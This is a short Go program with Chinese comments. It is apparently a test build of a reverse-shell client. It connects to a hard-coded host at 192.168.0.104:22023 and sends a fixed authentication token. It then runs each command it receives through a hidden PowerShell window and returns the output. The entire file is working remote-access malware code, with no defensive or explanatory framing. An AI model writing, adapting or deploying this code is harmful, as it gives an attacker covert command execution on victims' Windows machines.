package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
	"syscall"
)

//测试版，powershell执行命令
func main() {

	// 配置客户端
	conn, err := net.Dial("tcp", "192.168.0.104:22023")
	if err != nil {
		fmt.Println("客户端创建失败:", err)
		return
	}

	defer conn.Close()
	certified(conn)
	for {
		commend := recv_client(conn)
		fmt.Println("接收到数据:", commend)
		result := Exec(commend)
		conn.Write([]byte(result))
	}
}

func Exec(commend string) string {
	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "hidden", "-Command", commend)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("命令执行失败", err)
	}
	fmt.Println(string(out))

	cmd.Wait()
	return string(out)
}

func recv_client(conn net.Conn) string {
	buf := make([]byte, 4096)
	n, err := conn.Read(buf[:])
	if err != nil {
		log.Fatal("接收数据失败", err)
	}
	return string(buf[:n])
}

func certified(conn net.Conn) {
	conn.Write([]byte("6C14DA109E294D1E8155BE8AA4B1CE8E"))
	if recv_client(conn) == "OK" {
		conn.Write([]byte("认证成功,客户端上线!"))
	} else {
		log.Fatal("认证失败")
	}
	// if recv_client(conn) == "OK"
}
